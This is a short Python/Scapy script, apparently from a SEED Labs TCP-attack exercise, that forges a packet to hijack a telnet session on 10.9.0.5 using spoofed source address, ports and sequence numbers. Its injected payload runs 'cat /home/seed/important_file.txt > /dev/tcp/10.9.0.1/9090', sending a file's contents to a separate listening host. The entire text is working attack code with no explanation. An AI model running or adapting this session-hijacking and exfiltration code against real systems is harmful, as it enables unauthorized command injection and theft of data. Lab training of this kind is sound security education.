#!/usr/bin/env python3
from scapy.all import *

ip = IP(src="10.9.0.6", dst="10.9.0.5")
tcp = TCP(sport=58028, dport=23, flags="A", seq=3689266147, ack=1309466912)
data = "\r cat /home/seed/important_file.txt > /dev/tcp/10.9.0.1/9090\r"
pkt = ip/tcp/data
ls(pkt)
send(pkt, verbose=0)